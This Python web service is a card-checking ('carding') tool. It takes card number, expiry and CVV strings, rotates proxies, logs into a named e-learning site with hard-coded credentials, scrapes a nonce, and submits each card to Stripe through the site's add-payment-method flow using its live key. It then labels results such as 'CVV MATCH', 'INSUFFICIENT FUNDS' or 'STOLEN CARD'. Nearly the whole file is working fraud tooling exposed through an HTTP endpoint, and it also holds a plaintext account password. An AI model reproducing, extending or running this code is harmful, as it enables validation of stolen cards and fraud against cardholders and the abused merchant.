import asyncio
import random
import time
import httpx
import json
from aiohttp import web
from html import unescape
import pathlib

def load_proxies_from_file(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                    proxies.append(proxy_url)
                else:
                    print(f"Proxy format error (harus ip:port:user:pass): {line}")
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
    return proxies

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def charge_resp(result):
    try:
        if (
            '{"status":"SUCCESS",' in result or
            '"status":"success"' in result
        ):
            response = "Payment method successfully added ✅"
        elif "Thank you for your donation" in result:
            response = "Payment successful! 🎉"
        elif "insufficient funds" in result.lower() or "card has insufficient funds." in result.lower():
            response = "INSUFFICIENT FUNDS ✅"
        elif (
            "incorrect_cvc" in result.lower()
            or "security code is incorrect" in result.lower()
            or "your card's security code is incorrect." in result.lower()
        ):
            response = "CVV INCORRECT ❎"
        elif "transaction_not_allowed" in result.lower():
            response = "TRANSACTION NOT ALLOWED ❎"
        elif '"cvc_check": "pass"' in result:
            response = "CVV MATCH ✅"
        elif "your card could not be set up for future usage." in result:
            response = "Your card could not be set up for future usage ❎"
        elif "requires_action" in result.lower():
            response = "VERIFICATION 🚫"
        elif (
            "three_d_secure_redirect" in result.lower()
            or "card_error_authentication_required" in result.lower()
            or "wcpay-confirm-pi:" in result.lower()
            or "3ds required" in result.lower()
        ):
            response = "3DS Required ❎"
        elif "your card does not support this type of purchase." in result.lower():
            response = "CARD DOES NOT SUPPORT THIS PURCHASE ❎"
        elif (
            "generic_decline" in result.lower()
            or "you have exceeded the maximum number of declines on this card in the last 24 hour period." in result.lower()
            or "card_decline_rate_limit_exceeded" in result.lower()
            or "this transaction cannot be processed." in result.lower()
            or '"status":400,' in result.lower()
        ):
            response = "GENERIC DECLINED ❌"
        elif "do not honor" in result.lower():
            response = "DO NOT HONOR ❌"
        elif "suspicious activity detected. try again in a few minutes." in result.lower():
            response = "TRY AGAIN IN A FEW MINUTES ❌"
        elif "fraudulent" in result.lower():
            response = "FRAUDULENT ❌"
        elif "setup_intent_authentication_failure" in result.lower():
            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
        elif "invalid cvc" in result.lower():
            response = "INVALID CVV ❎"
        elif "stolen card" in result.lower():
            response = "STOLEN CARD ❌"
        elif "lost_card" in result.lower():
            response = "LOST CARD ❌"
        elif "pickup_card" in result.lower():
            response = "PICKUP CARD ❌"
        elif "incorrect_number" in result.lower():
            response = "INCORRECT CARD NUMBER ❌"
        elif "your card has expired." in result.lower() or "expired_card" in result.lower():
            response = "EXPIRED CARD ❌"
        elif "intent_confirmation_challenge" in result.lower():
            response = "CAPTCHA ❌"
        elif "your card number is incorrect." in result.lower():
            response = "INCORRECT CARD NUMBER ❌"
        elif (
            "your card's expiration year is invalid." in result.lower()
        ):
            response = "EXPIRATION YEAR INVALID ❌"
        elif (
            "your card's expiration month is invalid." in result.lower()
            or "invalid_expiry_month" in result.lower()
        ):
            response = "EXPIRATION MONTH INVALID ❌"
        elif "card is not supported." in result.lower():
            response = "CARD NOT SUPPORTED ❌"
        elif "invalid account" in result.lower():
            response = "DEAD CARD ❌"
        elif (
            "invalid api key provided" in result.lower()
            or "testmode_charges_only" in result.lower()
            or "api_key_expired" in result.lower()
            or "your account cannot currently make live charges." in result.lower()
        ):
            response = "stripe error contact support@stripe.com for more details ❌"
        elif "your card was declined." in result.lower() or "card was declined" in result.lower():
            response = "Your card was declined ❌"
        elif "card number is incorrect." in result.lower():
            response = "CARD NUMBER INCORRECT ❌"
        elif "sorry, we are unable to process your payment at this time. please retry later." in result.lower():
            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
        elif "card number is incomplete." in result.lower():
            response = "CARD NUMBER INCOMPLETE ❌"
        elif "the order total is too high for this payment method" in result.lower():
            response = "ORDER TOO HIGH FOR THIS CARD ❌"
        elif "the order total is too low for this payment method" in result.lower():
            response = "ORDER TOO LOW FOR THIS CARD ❌"
        elif "please update bearer token" in result.lower():
            response = "Token Expired Admin Has Been Notified ❌"
        else:
            response = result + " ❌"
            with open("result_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{result}\n")

        return response
    except Exception as e:
        return f"{str(e)} ❌"

async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        headers1 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/members/parael10/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/login/', headers=headers1)

        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
        if not login_token:
            return "Failed to get login token"

        headers2 = headers1.copy()
        headers2.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
        })

        data_login = {
            'learndash-login-form': login_token,
            'pmpro_login_form_used': '1',
            'log': 'parael10@gmail.com',   # Ganti sesuai login yang sesuai
            'pwd': 'parael',               # Ganti password yang sesuai
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)

        for url in [
            'https://elearntsg.com/activity-feed/',
            'https://elearntsg.com/my-account/payment-methods/',
            'https://elearntsg.com/my-account/add-payment-method/'
        ]:
            response = await session.get(url, headers=headers1)

        nonce = gets(response.text, '"add_card_nonce":"', '"')
        if not nonce:
            return "Failed to get add_card_nonce"

        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data_stripe = {
            'type':'card',
            'billing_details[name]':'parael senoman',
            'billing_details[email]':'parael10@gmail.com',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
            'referrer':'https://elearntsg.com',
            'time_on_page':'146631',
            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)

        try:
            id = response.json()['id']
        except Exception:
            return response.text

        headers_ajax = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data_ajax = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)

        return response.text

    except Exception as e:
        return f"Exception: {str(e)}"

async def multi_checking(fullz, proxies):
    start = time.time()
    if proxies:
        proxy = random.choice(proxies)
        async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
            result = await create_payment_method(fullz, session)
            response = await charge_resp(result)
    else:
        # Tanpa proxy
        async with httpx.AsyncClient(timeout=40) as session:
            result = await create_payment_method(fullz, session)
            response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        json_resp = json.loads(result)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        pass

    if error_message:
        return f"{fullz} {error_message} ❌ {elapsed}s"
    else:
        return f"{fullz} {response} {elapsed}s"

async def check_card(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid or missing JSON body"}, status=400)

    cc = data.get("cc")
    if not cc:
        return web.json_response({"error": "Missing 'cc' field"}, status=400)

    proxies = request.app.get("proxies", [])

    try:
        result = await multi_checking(cc, proxies)
        return web.json_response({"result": result})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)

async def index(request):
    path = pathlib.Path(__file__).parent / "index.html"
    return web.FileResponse(path)

async def init_app():
    app = web.Application()
    app["proxies"] = load_proxies_from_file("proxy.txt")
    app.router.add_get("/", index)
    app.router.add_post("/check-card", check_card)
    return app

if __name__ == "__main__":
    app = asyncio.run(init_app())
    web.run_app(app, host="0.0.0.0", port=8080)
